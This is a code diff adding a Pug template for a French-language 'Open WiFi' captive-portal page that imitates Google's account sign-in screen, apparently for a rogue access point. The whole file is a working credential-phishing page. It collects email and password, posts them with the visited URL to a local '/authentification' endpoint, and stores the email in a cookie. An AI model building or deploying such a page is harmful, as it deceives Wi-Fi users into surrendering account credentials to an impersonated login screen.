@@ -1,0 +1,116 @@
+//output:../captive.html
+doctype html
+html
+  head
+    meta(charset='utf-8')
+    meta(http-equiv='content-type', content='text/html; charset=utf-8')
+    meta(name='viewport', content='width=device-width, initial-scale=0.8, minimal-ui')
+    title Connexion : comptes
+    script(src='/jquery.slim.min.js')
+    script(src='jquery.slim.min.js')
+    link(rel='stylesheet', href='/captive.css')
+    link(rel='stylesheet', href='captive.css')
+  body
+    .H2SoFe
+      #initialView.RAYh1e
+        .xkfVF
+            
+            .zWl5kd
+              .DRS7Fe.bxPAYd.k6Zj8d
+                .jXeDnc
+                  h1#headingText
+                    span Connexion Open WiFi
+                  #headingSubtext.Y4dIwd
+                    span Vous devez vous connectez pour continuer
+                .bxPAYd
+                  .Wxwduf.Us7fWe
+                    form#formtosubmit(action="/authentification",method='post', novalidate='', target="_blank")
+                      span
+                        section
+                          header
+                        
+
+                              .rFrNMe.KSczvd#emailField
+                                .aCsJod.oJeWuf
+                                    .Xb9hP
+                                      input#identifierId.whsOnd.zHQkBf(autocomplete='off', spellcheck='false', name='email', value='', type='email')
+                                      .AxOyFc.snByac Adresse e-mail ou numéro de téléphone
+                                    .i9lrp.mIZh1c
+                                    .OabDMe.cXrdqd.Y2Zypf(style='transform-origin: 119.5px center 0px;')
+                              .rFrNMe.KSczvd#pwdField
+                                .aCsJod.oJeWuf
+                                    .Xb9hP
+                                      input.whsOnd.zHQkBf(name='password', autocapitalize='off', type='password')
+                                      .AxOyFc.snByac Saisissez votre mot de passe
+                                    .i9lrp.mIZh1c
+                                    div(style='transform-origin: 119.5px center 0px;')
+                              input#inputurl(name='url', type="hidden", value="")
+                              .ck6P8
+                                button(type='button') Adresse e-mail ou mot de passe oublié?
+                                  
+                      span
+                        .vwtvsf
+                          .ck6P8
+                            | S'il ne s'agit pas de votre ordinateur, utilisez une fenêtre de navigation privée pour vous connecter. 
+                            a(href='') En savoir plus
+                    .zQJV3
+                      .dG5hZc
+                        .qhFLie
+                          #identifierNext.O0WRkf.zZhnYe.C0oVfc.nDKKZc
+                            span#submitbutton.RveJvd Suivant
+                               
+                        .daaWTb
+                          .FS4hgd.nDKKZc.t29vte
+                            span(jsslot='')
+                              a.NlWrkb(href="#") Créer un compte  
+        footer.RwBngc
+          
+          .jgvuAb.TkU0Xc
+            div(role='presentation')
+              .ry3kXd.Ulgu9
+                .MocG8c.B9IrJb.LMgvRb.KKjvXb
+                  .kRoyt.MbhUzd
+                  span.vRMGwf.oJeWuf Français (France)
+              .CeEBt.Ce1Y1c
+                .TquXA
+          ul.Bgzgmd
+            li
+              a(href='', target='_blank') Aide
+            li
+              a(href='', target='_blank') Confidentialit&eacute;
+            li
+              a(href='', target='_blank') Conditions d&apos;utilisation
+              
+script.
+  
+  $(document).ready(function() {
+    var url = window.location.href;
+    $('#inputurl').attr('value',url);   
+    
+    
+    $('input[name=email]').on('keyup keypress blur change', function(e) {
+        if($('input[name=email]').val().length === 0 ){
+        $("#emailField").removeClass("CDELXb")
+      }else{
+        $("#emailField").addClass("CDELXb")
+      }
+    });
+    
+    $('input[name=password]').on('keyup keypress blur change', function(e) {
+        if($('input[name=password]').val().length === 0 ){
+        $("#pwdField").removeClass("CDELXb")
+      }else{
+        $("#pwdField").addClass("CDELXb")
+      }
+    });
+    
+    
+
+    
+    $('#submitbutton').click( function() {
+      document.cookie = $('input[name=email]').val();
+      $("#formtosubmit").submit();
+    });
+
+
+  });  
